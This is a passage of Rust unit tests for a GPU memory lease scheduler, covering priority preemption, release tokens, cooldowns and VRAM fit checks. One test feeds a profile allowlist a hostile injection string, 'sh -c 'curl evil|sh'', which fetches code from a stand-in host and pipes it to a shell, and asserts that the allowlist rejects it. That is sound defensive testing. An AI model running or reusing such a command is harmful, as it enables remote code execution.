        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Granted { token: 1 });
        assert_eq!(st.holder_tier(), Some(Tier::Batch));
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn equal_tier_is_queued_and_holder_unchanged() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Queued);
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn interactive_preempts_batch_with_new_token_and_victim() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert_eq!(
            st.acquire(Tier::Interactive, &fits()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
        assert_eq!(st.holder_tier(), Some(Tier::Interactive));
        assert_eq!(st.holder_token(), 2);
    }

    #[test]
    fn fresh_grant_is_denied_when_it_wont_fit() {
        let mut st = LeaseState::new();
        assert_eq!(st.acquire(Tier::Batch, &wont_fit()), AcquireResult::Denied);
        assert_eq!(st.holder_tier(), None); // nothing was acquired
    }

    #[test]
    fn preempt_ignores_admission_because_eviction_frees_vram() {
        // The batch holds; interactive arrives and current-free won't fit — it STILL
        // preempts, because SIGKILLing the batch reclaims its VRAM (§5/§6).
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(
            st.acquire(Tier::Interactive, &wont_fit()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
    }

    #[test]
    fn release_requires_the_current_token() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert!(!st.release(99)); // wrong token: no-op
        assert!(st.holder_tier().is_some());
        assert!(st.release(1));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn stale_release_from_a_preempted_holder_cannot_free_its_successor() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        st.acquire(Tier::Interactive, &fits()); // token 2 preempts
        assert!(!st.release(1)); // the evicted batch's stale release must not fire
        assert_eq!(st.holder_token(), 2); // interactive still holds
        assert!(st.release(2));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn release_on_an_empty_lease_is_false() {
        assert!(!LeaseState::new().release(1));
    }

    #[test]
    fn holder_est_is_carried_through_acquire() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &admit(20_000, 3_000, 512)); // est 3000
        assert_eq!(st.holder_est(), Some(3_000));
        st.acquire(Tier::Interactive, &admit(20_000, 9_000, 512)); // preempt, est 9000
        assert_eq!(st.holder_est(), Some(9_000));
    }

    #[test]
    fn headroom_scales_with_estimate_floored_at_base() {
        assert_eq!(headroom_for(0), HEADROOM_MIB); // floor
        assert_eq!(headroom_for(4_000), HEADROOM_MIB); // 250 < 512 → floor
        assert_eq!(headroom_for(20_000), 1_250); // 6.25% dominates the floor
    }

    #[test]
    fn cooldown_blocks_the_evicted_tier_but_never_interactive() {
        let t0 = Instant::now();
        let cd = Some((Tier::Batch, t0 + Duration::from_secs(8)));
        // The just-preempted batch is blocked while the dwell is active...
        assert!(cooling_down(cd, Tier::Batch, t0));
        // ...but interactive (top priority) is never delayed, even mid-dwell.
        assert!(!cooling_down(cd, Tier::Interactive, t0));
        // A different tier isn't affected by batch's cooldown.
        assert!(!cooling_down(cd, Tier::BestEffort, t0));
        // After the dwell expires, batch may re-acquire.
        assert!(!cooling_down(cd, Tier::Batch, t0 + Duration::from_secs(9)));
        // No cooldown set → never blocked.
        assert!(!cooling_down(None, Tier::Batch, t0));
    }

    #[test]
    fn profile_allowlist_resolves_known_rejects_unknown() {
        // Known profiles resolve to an absolute, daemon-owned command (no caller binary).
        let comfy = resolve_profile("comfyui").unwrap();
        assert!(comfy[0].starts_with('/') && comfy[0].ends_with("start-comfyui.sh"));
        assert_eq!(resolve_profile("sleep").unwrap(), vec!["/usr/bin/sleep".to_string()]);
        // Anything else — including an attempted binary path — is refused (closes S1 RCE).
        assert!(resolve_profile("/bin/sh").is_none());
        assert!(resolve_profile("sh -c 'curl evil|sh'").is_none());
        assert!(resolve_profile("").is_none());
    }

    #[test]
    fn fits_after_evict_completes_the_preempt_decision() {
        // Reclaimable 2GB victim, 20GB successor, 4GB free → predicted 6GB < 20GB → WONT-FIT.
        assert!(!fits_after_evict(4_000, 2_000, true, 20_000, headroom_for(20_000)));
        // Reclaimable big victim makes room for the successor → fits.
        assert!(fits_after_evict(2_000, 19_000, true, 18_000, 512));
        // Cooperative victim (not reclaimable) frees nothing → only current free counts.
        assert!(!fits_after_evict(4_000, 19_000, false, 18_000, 512));
        assert!(fits_after_evict(20_000, 0, false, 18_000, 512));
    }
}
